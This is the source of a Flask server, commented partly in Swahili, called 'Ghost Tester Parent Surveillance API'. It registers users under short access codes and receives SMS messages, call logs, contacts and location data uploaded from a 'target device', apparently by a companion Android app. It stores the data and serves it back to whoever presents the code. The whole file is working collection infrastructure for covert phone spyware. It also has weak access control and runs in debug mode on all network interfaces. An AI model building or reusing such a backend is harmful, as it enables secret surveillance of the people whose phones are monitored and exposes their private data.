from flask import Flask, request, jsonify
import sqlite3
import json
from datetime import datetime

app = Flask(__name__)
app.config['DATABASE'] = 'ghost_tester_parents.db'

def init_db():
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS parents
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  full_name TEXT NOT NULL,
                  phone_number TEXT UNIQUE NOT NULL,
                  email TEXT,
                  parent_code TEXT UNIQUE NOT NULL,
                  child_phone TEXT,
                  relationship TEXT,
                  created_at DATETIME DEFAULT CURRENT_TIMESTAMP)''')

    c.execute('''CREATE TABLE IF NOT EXISTS parent_surveillance_data
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  parent_code TEXT NOT NULL,
                  target_device TEXT,
                  data_type TEXT,
                  data_content TEXT,
                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    
    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect(app.config['DATABASE'])
    conn.row_factory = sqlite3.Row
    return conn

# ENDPOINT YA KUTHIBITISHA PARENT CODE
@app.route('/api/parent/verify-code', methods=['POST'])
def verify_parent_code():
    try:
        data = request.get_json()
        parent_code = data.get('parent_code', '').strip().upper()

        print(f"🔍 VERIFYING PARENT CODE: {parent_code}")

        if not parent_code:
            return jsonify({'valid': False, 'error': 'Parent code is required'}), 400

        conn = get_db()
        parent = conn.execute('SELECT * FROM parents WHERE parent_code = ?', (parent_code,)).fetchone()
        conn.close()

        if parent:
            print(f"✅ PARENT CODE VERIFIED: {parent_code} for {parent['full_name']}")
            return jsonify({
                'valid': True,
                'parent_name': parent['full_name'],
                'child_phone': parent['child_phone'],
                'message': 'Code verified successfully'
            }), 200
        else:
            print(f"❌ INVALID PARENT CODE: {parent_code}")
            return jsonify({
                'valid': False,
                'error': 'Invalid parent code! Check your code and try again.'
            }), 404

    except Exception as e:
        print(f"❌ PARENT VERIFICATION ERROR: {e}")
        return jsonify({'valid': False, 'error': str(e)}), 500

# ENDPOINT MPYA YA KUPOKEA DATA - RAHISI NA DIRECT
@app.route('/api/data/upload', methods=['POST'])
def upload_surveillance_data():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data received'}), 400

        parent_code = data.get('parent_code')
        data_type = data.get('data_type', 'unknown')
        device_id = data.get('device_id', 'unknown')
        content = data.get('data', [])

        print(f"📱 DATA RECEIVED - Parent: {parent_code}, Type: {data_type}, Items: {len(content)}")

        if not parent_code:
            return jsonify({'error': 'Parent code is required'}), 400

        # Verify parent code exists
        conn = get_db()
        parent = conn.execute('SELECT * FROM parents WHERE parent_code = ?', (parent_code,)).fetchone()

        if not parent:
            conn.close()
            return jsonify({'error': 'Invalid parent code'}), 400

        # Save each data item
        for item in content:
            conn.execute('''INSERT INTO parent_surveillance_data
                          (parent_code, target_device, data_type, data_content)
                          VALUES (?, ?, ?, ?)''',
                      (parent_code, device_id, data_type, json.dumps(item)))
        
        conn.commit()
        conn.close()

        print(f"✅ Data saved successfully for parent: {parent_code}")
        return jsonify({
            'status': 'success',
            'message': f'Received {len(content)} {data_type} items',
            'parent_name': parent['full_name']
        }), 200

    except Exception as e:
        print(f"❌ DATA UPLOAD ERROR: {e}")
        return jsonify({'error': str(e)}), 500

# ENDPOINT YA KUREGISTER PARENT
@app.route('/api/parent/register', methods=['POST'])
def register_parent():
    try:
        data = request.get_json()
        full_name = data.get('full_name')
        phone_number = data.get('phone_number')
        email = data.get('email', '')
        child_phone = data.get('child_phone')
        relationship = data.get('relationship', 'parent')

        import secrets
        parent_code = secrets.token_hex(4).upper()

        conn = get_db()
        try:
            cursor = conn.cursor()
            cursor.execute('''INSERT INTO parents
                          (full_name, phone_number, email, parent_code, child_phone, relationship)
                          VALUES (?, ?, ?, ?, ?, ?)''',
                         (full_name, phone_number, email, parent_code, child_phone, relationship))

            parent_id = cursor.lastrowid
            conn.commit()

            return jsonify({
                'success': True,
                'parent_code': parent_code,
                'message': 'Parent registered successfully'
            }), 200

        except sqlite3.IntegrityError:
            return jsonify({'error': 'Phone number already registered'}), 400
        finally:
            conn.close()

    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ENDPOINT YA KUANGALIA DATA YA PARENT
@app.route('/api/parent/data/<parent_code>')
def get_parent_data(parent_code):
    try:
        conn = get_db()
        
        # Get data counts
        sms_count = conn.execute('''SELECT COUNT(*) FROM parent_surveillance_data 
                                  WHERE parent_code = ? AND data_type = "sms"''', 
                               (parent_code,)).fetchone()[0]
        
        calls_count = conn.execute('''SELECT COUNT(*) FROM parent_surveillance_data 
                                   WHERE parent_code = ? AND data_type = "call_logs"''', 
                                (parent_code,)).fetchone()[0]
        
        contacts_count = conn.execute('''SELECT COUNT(*) FROM parent_surveillance_data 
                                      WHERE parent_code = ? AND data_type = "contacts"''', 
                                   (parent_code,)).fetchone()[0]
        
        locations_count = conn.execute('''SELECT COUNT(*) FROM parent_surveillance_data 
                                       WHERE parent_code = ? AND data_type = "location"''', 
                                    (parent_code,)).fetchone()[0]

        # Get recent data
        recent_data = conn.execute('''SELECT * FROM parent_surveillance_data 
                                    WHERE parent_code = ? 
                                    ORDER BY timestamp DESC 
                                    LIMIT 50''', 
                                 (parent_code,)).fetchall()

        conn.close()

        return jsonify({
            'success': True,
            'stats': {
                'sms': sms_count,
                'calls': calls_count,
                'contacts': contacts_count,
                'locations': locations_count
            },
            'recent_data': [dict(item) for item in recent_data]
        }), 200

    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/')
def home():
    return '''
    <h1>Ghost Tester Parent Surveillance API</h1>
    <p>✅ API is running</p>
    <p>Endpoints:</p>
    <ul>
        <li><strong>POST /api/parent/verify-code</strong> - Verify parent code</li>
        <li><strong>POST /api/data/upload</strong> - Upload surveillance data</li>
        <li><strong>POST /api/parent/register</strong> - Register new parent</li>
        <li><strong>GET /api/parent/data/&lt;code&gt;</strong> - Get parent data</li>
    </ul>
    '''

if __name__ == '__main__':
    print("🚀 Ghost Tester Parent API Started")
    print("📱 Endpoints ready for Android app")
    app.run(debug=True, host='0.0.0.0', port=5000)
